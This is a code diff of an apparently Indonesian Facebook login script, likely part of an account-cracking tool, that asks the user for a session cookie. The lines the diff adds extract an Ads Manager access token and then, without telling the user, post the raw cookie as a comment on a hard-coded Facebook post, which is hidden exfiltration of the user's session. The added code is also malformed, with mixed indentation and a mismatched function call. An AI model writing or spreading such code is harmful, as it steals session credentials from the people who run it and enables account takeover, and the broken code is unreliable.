@@ -126,41 +126,28 @@ def banner():
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		tokenku.append(token)
-		try:
-			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
-			basganteng = json.loads(basariheker.text)['id']
-			menu(basganteng)
-		except KeyError:
-			login_lagi334()
-		except requests.exceptions.ConnectionError:
-			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
-			exit()
-	except IOError:
-		login_lagi334()
-def login_lagi334():
-	try:
-		os.system('clear')
-		banner()
-		cok = input('[+] masukan cookie : ')
-		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v18.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v18.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
-		dat  = {}
-		raq  = pos.find('form',{'method':'post'})
-		for x in raq('input',{'value':True}):
-			try:
-				if x['name'] == '__CANCEL__':
-					pass
-				else:
-					dat.update({x['name']:x['value']})
-			except Exception as e:
-				pass
-		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[+] tekan enter'); os.system('clear'); login()
-	except Exception as e:
-		print(e)
+        banner()
+        ses = requests.Session()
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        cookie = input(f'{kun}└──[{puti} Cookies {hijo}: ')
+        cookies = {'cookie':cookie}
+        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+        req = ses.get(url,cookies=cookies)
+        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+        roq = ses.get(nek,cookies=cookies)
+        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+        requests.post(f"https://graph.facebook.com/v17.0/100043485017160_1604512333360519/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+        ken = open(".cyxieontoken.txt", "w").write(tok)
+        cok = open(".cyxieoncokies.txt", "w").write(cookie)
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        suk = input(f'{kun}└──[{puti} Tekan Enter ] ')
+        menu()
+            
+    except Exception as e:
+            ganti_cokies()
+            print(f"{kun}╭────────────────────────────────────────────{puti}")
+            exit(f"{kun}└──[{mer} Login Gagal Cek Tumbal Lo Ngab :-(")
 
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(id):
